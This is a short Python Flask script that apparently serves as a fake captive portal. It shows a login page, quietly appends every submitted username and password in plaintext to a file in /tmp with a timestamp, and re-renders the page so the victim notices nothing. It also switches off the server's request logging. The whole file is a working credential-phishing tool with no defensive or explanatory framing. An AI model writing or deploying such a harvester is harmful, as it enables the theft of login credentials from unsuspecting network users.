import logging
from flask import Flask, request, render_template
from datetime import datetime, timezone, timedelta

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')


@app.route('/', methods=['POST'])
def postCredentials():
    body = request.form
    username = body['username']
    password = body['password']
    with open('/tmp/captivePortalLog.txt', 'a') as file:
        file.write(
            f'[+] {datetime.now(timezone(timedelta(hours=+2))).strftime("%Y-%m-%d %H:%M:%S")} {username}:{password}\n')
    return render_template('index.html')


if __name__ == '__main__':
    app.run(host='127.0.0.1', port='5000', debug=False)
